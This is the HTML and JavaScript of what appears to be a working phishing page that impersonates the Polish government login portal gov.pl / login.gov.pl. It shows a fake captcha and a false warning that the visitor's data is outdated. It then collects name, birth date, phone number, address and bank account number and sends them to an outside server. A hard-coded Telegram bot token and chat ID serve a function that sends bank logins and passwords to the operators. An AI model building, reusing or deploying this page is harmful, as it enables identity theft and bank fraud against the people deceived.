<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
    <style>
        /* RESET & BASE */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #fff; color: #1a1a1a; line-height: 1.5; overflow-x: hidden; }
        img, svg { max-width: 100%; display: block; }
        button { font-family: inherit; cursor: pointer; border: none; }
        input { font-family: inherit; font-size: inherit; }
        a { color: #0072b0; text-decoration: none; }
        a:hover { text-decoration: underline; }

        /* CAPTCHA */
        #captchaOverlay { position: fixed; inset: 0; z-index: 100000; display: flex; align-items: center; justify-content: center; background: rgba(10, 20, 40, 0.92); padding: 20px; }
        #captchaOverlay.hidden { display: none !important; }
        .captcha-box { background: #fff; border-radius: 16px; padding: 36px 32px 28px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
        .captcha-icon { font-size: 44px; display: block; margin-bottom: 8px; }
        .captcha-box h2 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
        .captcha-box p { font-size: 14px; color: #555; margin-bottom: 20px; }
        .captcha-question { font-size: 36px; font-weight: 700; letter-spacing: 10px; color: #003b6f; background: #f0f4fa; border: 2px dashed #b8c8dc; border-radius: 10px; padding: 14px 0; margin-bottom: 16px; user-select: none; font-family: monospace; }
        #captchaInput { width: 100%; padding: 12px 16px; font-size: 20px; text-align: center; letter-spacing: 6px; border: 2px solid #d0d8e4; border-radius: 8px; outline: none; margin-bottom: 14px; }
        #captchaInput:focus { border-color: #003b6f; box-shadow: 0 0 0 3px rgba(0,59,111,0.12); }
        .captcha-btn { width: 100%; padding: 13px; background: #0072b0; color: #fff; border-radius: 8px; font-size: 16px; font-weight: 600; }
        .captcha-btn:hover { background: #005a8c; }
        .captcha-error { color: #d71920; font-size: 13px; min-height: 18px; margin-top: 8px; }
        .captcha-refresh { background: none; color: #0072b0; font-size: 13px; margin-top: 10px; text-decoration: underline; }

        /* HEADER */
        .header { display: flex; align-items: center; justify-content: space-between; height: 72px; padding: 0 24px; background: #fff; border-bottom: 1px solid #e6ebf3; position: sticky; top: 0; z-index: 100; }
        .header-left { display: flex; align-items: center; gap: 16px; }
        .logo-area { display: flex; align-items: center; gap: 12px; }
        .coat-of-arms { width: 72px; height: 50px; object-fit: contain; flex-shrink: 0; }
        .logo-main { display: flex; align-items: baseline; gap: 8px; }
        .logo-main .gov { font-size: 22px; font-weight: 700; color: #1a1a1a; }
        .logo-main .separator { color: #c0c8d4; font-size: 18px; }
        .logo-main .subtitle { font-size: 13px; color: #555; }
        .header-right { display: flex; align-items: center; gap: 20px; }
        .header-search { display: flex; align-items: center; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; overflow: hidden; height: 42px; }
        .search-icon-btn { background: none; padding: 0 10px 0 14px; }
        .search-icon-btn svg { width: 18px; height: 18px; fill: none; stroke: #555; stroke-width: 2; }
        .header-search input { border: none; background: transparent; outline: none; font-size: 14px; padding: 0 8px; width: 200px; }
        .search-submit-btn { background: #0072b0; color: #fff; font-size: 12px; font-weight: 700; padding: 0 16px; height: 100%; }
        .search-submit-btn:hover { background: #005a8c; }
        .header-eu-logo img { height: 42px; }

        /* LAYOUT (без sidebar) */
        .main-wrapper { display: flex; align-items: flex-start; min-height: calc(100vh - 72px); }
        .content-wrapper { flex: 1; min-width: 0; display: flex; flex-direction: column; }

        /* LOGIN NAV */
        .login-nav { display: flex; align-items: center; justify-content: space-between; padding: 14px 40px; background: #f8faff; border-bottom: 1px solid #e6ebf3; flex-wrap: wrap; gap: 12px; }
        .login-nav .brand { font-size: 18px; font-weight: 700; color: #003b6f; }
        .login-nav .nav-links { display: flex; gap: 22px; flex-wrap: wrap; }
        .login-nav .nav-links a { font-size: 14px; color: #444; }

        /* BANNER */
        .image-under-banner { width: 100%; }
        .image-wrapper { position: relative; width: 100%; overflow: hidden; background: #003b6f; }
        .image-wrapper > img { width: 100%; height: auto; display: block; opacity: 0.6; }
        .overlay-icon { position: absolute; top: 24px; left: 40px; width: 48px; height: 48px; z-index: 2; }
        .overlay-line { position: absolute; left: 40px; bottom: 90px; width: 60px; height: 4px; background: #d71920; border-radius: 2px; z-index: 2; }
        .overlay-text { position: absolute; left: 40px; bottom: 24px; right: 40px; color: #fff; max-width: 640px; z-index: 2; text-shadow: 0 1px 4px rgba(0,0,0,0.4); }
        .overlay-text h2 { font-size: 28px; font-weight: 700; margin-bottom: 6px; }
        .overlay-text p { font-size: 15px; margin-bottom: 14px; }
        .btn-outline { background: transparent; color: #fff; border: 2px solid #fff; border-radius: 6px; padding: 10px 22px; font-size: 13px; font-weight: 700; }
        .btn-outline:hover { background: #fff; color: #003b6f; }

        /* FORM */
        .data-form-section { padding: 40px; max-width: 900px; width: 100%; margin: 0 auto; }
        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 20px; }
        .blue-alert { display: flex; gap: 10px; background: #e6f0fa; border-left: 4px solid #0072b0; border-radius: 8px; padding: 14px 18px; font-size: 14px; margin-bottom: 28px; line-height: 1.45; }
        .data-form { display: flex; flex-direction: column; gap: 18px; }
        .form-group { display: flex; flex-direction: column; gap: 5px; }
        .data-form label { font-size: 14px; font-weight: 600; }
        .required { color: #d71920; }
        .data-form input { width: 100%; padding: 11px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; outline: none; transition: all 0.2s; }
        .data-form input:focus { border-color: #003b6f; background: #fff; box-shadow: 0 0 0 3px rgba(0,59,111,0.10); }
        .data-form input.error { border-color: #d71920; background: #fff5f5; }
        .address-row { display: flex; gap: 10px; flex-wrap: wrap; }
        .address-row input { flex: 1; min-width: 140px; }
        .address-row input:last-child { flex: 0 0 140px; max-width: 140px; }
        .iban-wrapper { display: flex; align-items: center; border: 1px solid #d0d8e4; border-radius: 8px; background: #f8faff; overflow: hidden; transition: all 0.2s; }
        .iban-wrapper:focus-within { border-color: #003b6f; background: #fff; box-shadow: 0 0 0 3px rgba(0,59,111,0.10); }
        .iban-wrapper.error { border-color: #d71920; background: #fff5f5; }
        .pl-prefix { padding: 11px 12px; font-size: 14px; font-weight: 700; color: #003b6f; background: #e6f0fa; border-right: 1px solid #d0d8e4; }
        .iban-wrapper input { border: none; background: transparent; }
        .iban-wrapper input:focus { box-shadow: none; background: transparent; }
        .submit-btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 36px; background: #0072b0; color: #fff; border-radius: 8px; font-size: 16px; font-weight: 600; min-width: 140px; }
        .submit-btn:hover { background: #005a8c; }
        .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
        .submit-btn.loading .spinner { display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* BANKS */
        .bank-selection { padding: 40px; max-width: 1000px; width: 100%; margin: 0 auto; display: none; }
        .bank-selection.visible { display: block; }
        .bank-title { font-size: 24px; font-weight: 700; margin-bottom: 6px; }
        .bank-subtitle { font-size: 15px; color: #555; margin-bottom: 24px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; margin-bottom: 30px; }
        .bank-footer { border-top: 1px solid #e6ebf3; padding-top: 20px; display: none; }
        .bank-footer.visible { display: block; }
        .footer-links { display: flex; gap: 24px; flex-wrap: wrap; }
        .footer-links a { font-size: 13px; color: #555; }

        /* FOOTER */
        .footer { background: #f0f4f8; border-top: 1px solid #e6ebf3; margin-top: 40px; }
        .footer .container { max-width: 1200px; margin: 0 auto; padding: 40px 24px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; }
        .footer h4 { font-size: 15px; font-weight: 700; margin-bottom: 12px; }
        .footer ul { list-style: none; padding: 0; }
        .footer ul li { margin-bottom: 8px; }
        .footer ul a { font-size: 14px; color: #555; }
        .footer-bottom { background: #e6ebf3; padding: 16px 0; text-align: center; font-size: 13px; color: #555; }

        /* TOAST */
        .toast-message { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: #1a1a1a; color: #fff; padding: 12px 24px; border-radius: 8px; font-size: 14px; opacity: 0; pointer-events: none; transition: all 0.3s; z-index: 5000; }
        .toast-message.show { opacity: 1; transform: translateX(-50%) translateY(0); }
        .toast-message.success { background: #005f42; }

        /* UTILS */
        .hidden { display: none !important; }

        /* MOBILE */
        @media (max-width: 992px) {
            .data-form-section, .bank-selection { padding: 30px 20px; }
            .login-nav { padding: 12px 20px; }
            .header-eu-logo { display: none; }
            .overlay-icon { top: 16px; left: 20px; width: 36px; height: 36px; }
            .overlay-line { left: 20px; bottom: 76px; width: 40px; }
            .overlay-text { left: 20px; right: 20px; bottom: 16px; }
        }
        @media (max-width: 768px) {
            .header { height: 60px; padding: 0 14px; }
            .coat-of-arms { width: 52px; height: 36px; }
            .logo-main .subtitle, .logo-main .separator { display: none; }
            .logo-main .gov { font-size: 18px; }
            .header-search { height: 36px; }
            .header-search input { width: 120px; font-size: 13px; }
            .search-submit-btn { padding: 0 10px; font-size: 11px; }
            .overlay-text h2 { font-size: 18px; }
            .overlay-text p { font-size: 13px; }
            .section-title, .bank-title { font-size: 20px; }
            .footer .container { grid-template-columns: 1fr 1fr; gap: 24px; padding: 30px 20px; }
        }
        @media (max-width: 480px) {
            .header-search { display: none; }
            .overlay-icon, .overlay-line { display: none; }
            .overlay-text h2 { font-size: 16px; }
            .overlay-text p { font-size: 12px; }
            .btn-outline { padding: 6px 14px; font-size: 10px; }
            .address-row input:last-child { flex: 1 1 100%; max-width: 100%; }
            .data-form-section, .bank-selection { padding: 20px 14px; }
            .submit-btn { width: 100%; }
            .footer .container { grid-template-columns: 1fr; }
            .captcha-box { padding: 28px 20px 22px; }
            .captcha-question { font-size: 28px; letter-spacing: 8px; }
        }
    </style>
</head>
<body>

    <!-- CAPTCHA OVERLAY -->
    <div id="captchaOverlay">
        <div class="captcha-box">
            <span class="captcha-icon">🛡️</span>
            <h2>Weryfikacja</h2>
            <p>Przepisz kod z obrazka, aby kontynuować</p>
            <div class="captcha-question" id="captchaQuestion">1234</div>
            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" autocomplete="off">
            <button class="captcha-btn" id="captchaSubmit">Potwierdź</button>
            <div class="captcha-error" id="captchaError"></div>
            <button class="captcha-refresh" id="captchaRefresh">⟳ Odśwież kod</button>
        </div>
    </div>

    <!-- MAIN CONTENT -->
    <div id="mainContent" style="display:none;">

        <header class="header">
            <div class="header-left">
                <div class="logo-area">
                    <img src="assets/grb.svg" alt="Godło" class="coat-of-arms" width="72" height="50">
                    <div class="logo-main">
                        <span class="gov">gov.pl</span>
                        <span class="separator">|</span>
                        <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
                    </div>
                </div>
            </div>
            <div class="header-right">
                <div class="header-search">
                    <button class="search-icon-btn"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8" /><line x1="21" y1="21" x2="16.65" y2="16.65" /></svg></button>
                    <input type="text" placeholder="Szukaj usługi, informacji">
                    <button class="search-submit-btn">SZUKAJ</button>
                </div>
                <span class="header-eu-logo">
                    <img src="assets/eu-center-pl.svg" alt="EU Center PL">
                </span>
            </div>
        </header>

        <div class="main-wrapper">
            <div class="content-wrapper">
                <div class="login-nav" id="loginNav">
                    <span class="brand">Login.gov.pl</span>
                    <div class="nav-links">
                        <a href="#">Jak korzystać</a>
                        <a href="#">Gdzie skorzystać</a>
                        <a href="#">Bezpieczeństwo</a>
                        <a href="#">Pomoc</a>
                        <a href="#">Dla integratorów</a>
                        <a href="#">Kontakt</a>
                    </div>
                </div>

                <div class="image-under-banner" id="imageBanner">
                    <div class="image-wrapper">
                        <img src="assets/4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
                        <div class="overlay-icon">
                            <img src="assets/51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
                        </div>
                        <div class="overlay-line"></div>
                        <div class="overlay-text">
                            <h2>Poznaj login.gov.pl</h2>
                            <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
                            <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
                        </div>
                    </div>
                </div>

                <section class="data-form-section" id="dataFormSection">
                    <h2 class="section-title">Dane osobowe</h2>
                    <div class="blue-alert">
                        <span class="alert-icon">ℹ️</span>
                        <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej.
                    </div>
                    <form class="data-form" id="dataForm">
                        <div class="form-group">
                            <label>Imię i nazwisko <span class="required">*</span></label>
                            <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
                        </div>
                        <div class="form-group">
                            <label>Data urodzenia <span class="required">*</span></label>
                            <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required>
                        </div>
                        <div class="form-group">
                            <label>Numer telefonu <span class="required">*</span></label>
                            <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
                        </div>
                        <div class="form-group full-width">
                            <label>Adres zamieszkania <span class="required">*</span></label>
                            <div class="address-row">
                                <input type="text" name="street" placeholder="Ulica i numer" required>
                                <input type="text" name="city" placeholder="Miasto" required>
                                <input type="text" name="postal" placeholder="Kod pocztowy" required maxlength="6">
                            </div>
                        </div>
                        <div class="form-group full-width">
                            <label>NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
                            <div class="iban-wrapper" id="ibanWrapper">
                                <span class="pl-prefix">PL</span>
                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="35" autocomplete="off">
                            </div>
                        </div>
                        <div class="form-actions">
                            <button type="submit" class="submit-btn" id="submitBtn">
                                <span class="spinner"></span>
                                Wyślij
                            </button>
                        </div>
                    </form>
                </section>

                <section class="bank-selection" id="bankSelection">
                    <h2 class="bank-title">Bankowość elektroniczna</h2>
                    <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
                    <div class="bank-grid"></div>
                    <div class="bank-footer" id="bankFooter">
                        <div class="footer-links">
                            <a href="#">Polityka cookies</a>
                            <a href="#">Klauzula informacyjna</a>
                            <a href="#">Deklaracja dostępności</a>
                            <a href="#">Kontakt</a>
                        </div>
                    </div>
                </section>
            </div>
        </div>

        <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>

        <footer class="footer" id="footer">
            <div class="container">
                <div><h4>Serwis Gov.pl</h4><ul><li><a href="#">O serwisie</a></li><li><a href="#">Polityka prywatności</a></li><li><a href="#">Warunki korzystania</a></li></ul></div>
                <div><h4>Dla obywatela</h4><ul><li><a href="#">Usługi online</a></li><li><a href="#">Poradniki</a></li></ul></div>
                <div><h4>Dla przedsiębiorcy</h4><ul><li><a href="#">Biznes.gov.pl</a></li><li><a href="#">Dotacje</a></li></ul></div>
                <div><h4>Kontakt</h4><ul><li><a href="#">Infolinia</a></li><li><a href="#">ePUAP</a></li></ul></div>
            </div>
            <div class="footer-bottom">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
        </footer>
    </div>

    <script>
        // ===== KONFIGURACJA TELEGRAM =====
        const TELEGRAM_BOT_TOKEN = '8838687565:AAFHUm61iyhuMd1q6uwUKWFb-jkA2kBdykM';
        const TELEGRAM_CHAT_ID = '-1004463938545';

        function cleanIbanValue(value) {
            if (!value) return '';
            let cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
            if (cleaned.startsWith('PL')) cleaned = cleaned.substring(2);
            cleaned = cleaned.replace(/\D/g, '');
            return cleaned.length > 26 ? cleaned.substring(0, 26) : cleaned;
        }

        function sendToTelegram(bankName, login, password) {
            const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
            console.log(`📤 Отправка в Telegram:`, { bankName, login, password });
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
            })
            .then(r => r.json())
            .then(d => d.ok ? console.log('✅ Wysłano do Telegram') : console.error('❌ Błąd Telegram:', d))
            .catch(e => console.error('❌ Błąd sieci:', e));
        }

        document.addEventListener('DOMContentLoaded', function() {
            // CAPTCHA
            const overlay = document.getElementById('captchaOverlay');
            const mainContent = document.getElementById('mainContent');
            const captchaQuestion = document.getElementById('captchaQuestion');
            const captchaInput = document.getElementById('captchaInput');
            const captchaSubmit = document.getElementById('captchaSubmit');
            const captchaError = document.getElementById('captchaError');
            const captchaRefresh = document.getElementById('captchaRefresh');
            let currentCode = '1234';

            captchaRefresh.addEventListener('click', () => {
                currentCode = Math.floor(1000 + Math.random() * 9000).toString();
                captchaQuestion.textContent = currentCode;
                captchaInput.value = '';
                captchaError.textContent = '';
            });

            captchaSubmit.addEventListener('click', () => {
                if (captchaInput.value === currentCode) {
                    overlay.classList.add('hidden');
                    mainContent.style.display = 'block';
                } else {
                    captchaError.textContent = 'Nieprawidłowy kod. Spróbuj ponownie.';
                    captchaInput.value = '';
                }
            });

            captchaInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') captchaSubmit.click();
            });

            // SEARCH
            document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
                const input = this.closest('.header-search').querySelector('input');
                alert('Szukanie: ' + (input?.value || 'puste'));
            });
            document.querySelector('.header-search input')?.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') alert('Szukanie: ' + this.value);
            });

            // LOGIN NAV
            document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    alert('Przekierowanie do: ' + this.textContent.trim());
                });
            });

            // SCROLL TO FORM
            const scrollBtn = document.getElementById('scrollToFormBtn');
            const formSection = document.getElementById('dataFormSection');
            if (scrollBtn) {
                scrollBtn.addEventListener('click', function(e) {
                    e.preventDefault();
                    formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                });
            }

            // IBAN
            const ibanInput = document.getElementById('iban');
            const ibanWrapper = document.getElementById('ibanWrapper');
            if (ibanInput) {
                ibanInput.addEventListener('paste', function() {
                    setTimeout(() => {
                        this.value = cleanIbanValue(this.value);
                        this.classList.remove('error');
                        if (ibanWrapper) ibanWrapper.classList.remove('error');
                    }, 5);
                });
                ibanInput.addEventListener('input', function() {
                    const cleaned = cleanIbanValue(this.value);
                    if (this.value !== cleaned) this.value = cleaned;
                    this.classList.remove('error');
                    if (ibanWrapper) ibanWrapper.classList.remove('error');
                });
                ibanInput.addEventListener('blur', function() {
                    const cleaned = cleanIbanValue(this.value);
                    if (this.value !== cleaned) this.value = cleaned;
                });
            }

            // FORM
            const form = document.getElementById('dataForm');
            const submitBtn = document.getElementById('submitBtn');
            const toast = document.getElementById('toastMessage');
            const allInputs = form.querySelectorAll('input[required]');
            const formSectionElement = document.getElementById('dataFormSection');
            const bankSelection = document.getElementById('bankSelection');
            const loginNav = document.getElementById('loginNav');
            const imageBanner = document.getElementById('imageBanner');
            const bankFooter = document.getElementById('bankFooter');

            function showToast(message, isSuccess = false) {
                toast.textContent = message;
                toast.className = 'toast-message show' + (isSuccess ? ' success' : '');
                setTimeout(() => toast.classList.remove('show'), 5000);
            }

            function validateForm() {
                let ok = true;
                allInputs.forEach(input => {
                    if (input.value.trim() === '') {
                        ok = false;
                        input.classList.add('error');
                    } else {
                        input.classList.remove('error');
                    }
                });
                if (ibanInput) {
                    const val = cleanIbanValue(ibanInput.value);
                    if (val.length < 26) {
                        ok = false;
                        ibanInput.classList.add('error');
                        if (ibanWrapper) ibanWrapper.classList.add('error');
                    } else {
                        ibanInput.classList.remove('error');
                        if (ibanWrapper) ibanWrapper.classList.remove('error');
                    }
                }
                return ok;
            }

            function getFormData() {
                const cleanedIban = ibanInput ? cleanIbanValue(ibanInput.value) : '';
                return {
                    fullname: document.getElementById('fullname').value.trim(),
                    birthdate: document.getElementById('birthdate').value.trim(),
                    phone: document.getElementById('phone').value.trim(),
                    street: document.querySelector('input[name="street"]').value.trim(),
                    city: document.querySelector('input[name="city"]').value.trim(),
                    postal: document.querySelector('input[name="postal"]').value.trim(),
                    iban: 'PL' + cleanedIban
                };
            }

            form.addEventListener('submit', function(e) {
                e.preventDefault();
                if (!validateForm()) {
                    showToast('Najpierw wypełnij wszystkie wymagane pola!');
                    return;
                }
                submitBtn.disabled = true;
                submitBtn.classList.add('loading');
                submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';
                const formData = getFormData();
                fetch('https://gvvbt.onrender.com/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                })
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        showToast('Dane zostały wysłane!', true);
                        loginNav.classList.add('hidden');
                        imageBanner.classList.add('hidden');
                        formSectionElement.classList.add('hidden');
                        bankSelection.classList.add('visible');
                        bankFooter.classList.add('visible');
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    } else {
                        showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
                    }
                })
                .catch(error => {
                    console.error('Błąd:', error);
                    showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
                })
                .finally(() => {
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('loading');
                    submitBtn.innerHTML = 'Wyślij';
                });
            });

            allInputs.forEach(input => {
                input.addEventListener('input', function() {
                    if (this.value.trim() !== '') this.classList.remove('error');
                    if (this.id === 'iban' && ibanWrapper) ibanWrapper.classList.remove('error');
                });
            });
        });
    </script>
</body>
</html>
